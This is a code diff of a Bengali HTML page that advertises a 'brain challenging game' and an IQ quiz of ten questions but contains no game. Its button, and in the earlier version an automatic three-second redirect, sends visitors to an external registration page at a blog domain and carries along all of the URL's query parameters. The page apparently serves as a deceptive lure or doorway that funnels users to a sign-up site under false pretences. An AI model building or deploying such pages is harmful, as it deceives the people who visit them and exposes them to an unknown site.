@@ -2,47 +2,80 @@
 <html lang="bn">
 <head>
   <meta charset="UTF-8">
-  <title>মস্তিষ্কের চ্যালেঞ্জিং খেলা</title>
+  <title>মস্তিষ্কের চ্যালেঞ্জিং গেম</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f0f0f0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      min-height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      max-width: 400px;
+      background: #fff;
+      border-radius: 12px;
+      padding: 20px;
+      text-align: center;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    img {
+      max-width: 100%;
+      border-radius: 8px;
+      margin-bottom: 20px;
+    }
+    h1 {
+      font-size: 20px;
+      color: #333;
+      margin-bottom: 10px;
+    }
+    p {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 20px;
+    }
+    button {
+      background-color: #2196F3;
+      color: white;
+      border: none;
+      padding: 14px 20px;
+      font-size: 16px;
+      border-radius: 6px;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #0b7dda;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <img src="https://i.imgur.com/WWD2pEk.jpeg" alt="গেমের স্ক্রিনশট">
+    <h1>মস্তিষ্কের চ্যালেঞ্জিং গেম</h1>
+    <p>আপনার IQ কত? 10টি প্রশ্নে নিজেকে প্রমাণ করুন!</p>
+    <button onclick="go()">খেলা শুরু করুন</button>
+  </div>
+
   <script>
-    // 提取 URL 参数
     function getQueryParams() {
       const params = {};
-      window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(s, k, v) {
+      location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(s, k, v) {
         params[k] = decodeURIComponent(v);
       });
       return params;
     }
 
-    // 跳转逻辑
-    window.onload = function() {
-      const delay = 3000; // 延迟 3 秒
+    function go() {
       const target = "https://bkjjh1102.bk-33.blog/m/register";
       const params = getQueryParams();
-      const queryStr = Object.keys(params).map(k => `${k}=${params[k]}`).join("&");
-      const finalUrl = queryStr ? `${target}?${queryStr}` : target;
-
-      setTimeout(() => {
-        window.location.href = finalUrl;
-      }, delay);
+      const query = Object.keys(params).map(k => `${k}=${params[k]}`).join("&");
+      const url = query ? `${target}?${query}` : target;
+      window.location.href = url;
     }
   </script>
-  <style>
-    body {
-      font-family: sans-serif;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      background: #f4f4f4;
-    }
-    h1 {
-      font-size: 24px;
-      color: #444;
-    }
-  </style>
-</head>
-<body>
-  <h1>মস্তিষ্কের চ্যালেঞ্জিং খেলা লোড হচ্ছে...</h1>
 </body>
 </html>
